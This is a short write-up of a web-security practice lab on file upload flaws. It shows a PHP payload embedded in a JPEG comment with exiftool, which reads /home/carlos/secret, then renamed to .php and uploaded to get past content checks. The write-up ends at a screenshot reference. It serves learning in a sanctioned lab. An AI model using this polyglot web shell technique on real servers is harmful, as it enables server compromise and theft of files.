*This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.
To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
You can log in to your own account using the following credentials: wiener:peter *

Decided to insert a malicious script into an image using `exiftool`:
`exiftool -comment="<?php echo '123 '.file_get_contents('/home/carlos/secret').' 123 ';?>" image.jpg`
```
┌──(roshan㉿roshan)-[~/BSCP/file_upload]
└─$ exiftool image.jpg                                                                                  
ExifTool Version Number         : 12.76
File Name                       : image.jpg
...
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : <?php echo '123 '.file_get_contents('/home/carlos/secret').' 123 ';?>
...
```
The `123` is to separate the secret from the rest of the characters in the image. 

After playing around, I found that the application had no verification of the file extension, but was able to check the contents of the file, ensuring the dimensions are that of a `.jpg` file.

I converted the `.jpg` file to `.php` file so that the script is executed:
```
┌──(roshan㉿roshan)-[~/BSCP/file_upload]
└─$ cp image.jpg image.php
```

I then uploaded the file to the page, checking the `GET` request to retrieve the image, finding the following:
![Screenshot 2024-05-13 at 3.48.43 PM](images/Screenshot%202024-05-13%20at%203.48.43%20PM.png)
